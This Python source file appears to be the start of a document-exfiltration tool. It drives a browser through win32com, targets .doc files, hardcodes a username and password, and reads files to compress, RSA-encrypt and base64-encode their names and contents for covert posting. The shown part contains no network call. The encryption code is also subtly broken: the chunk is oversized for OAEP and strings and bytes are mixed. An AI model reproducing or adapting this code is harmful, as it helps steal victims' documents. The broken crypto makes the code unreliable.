import win32com.client
import os
import fnmatch
import time
import random
import zlib
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc"
username = "Allevon412"
password = "Gr4nd3r_123!@*"

public_key = ""

def wait_for_browser(browser):

    # wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return

def encrypt_String(plaintext):
    chunk_size = 256
    print("[*] Compressing: %d bytes" % len(plaintext))
    plaintext = zlib.compress(plaintext)

    print("[*] Encrypting %d bytes" % len(plaintext))

    rsakey = RSA.import_key(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)

    encrypted = ""
    offset = 0

    while offset < len(plaintext):

        chunk = plaintext[offset:offset+chunk_size]

        if len(chunk) % chunk_size != 0:
            chunk += " " * (chunk_size - len(chunk))

        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size

    encrypted = encrypted.encode("base64")

    print("Base64 encoded crypto: %d" % len(encrypted))

    return encrypted

def encrypt_post(filename):

    # open and read the file
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()

    encrypted_title = encrypt_String(filename)
    encrypted_body = encrypt_String(contents)

    return encrypted_title, encrypted_body
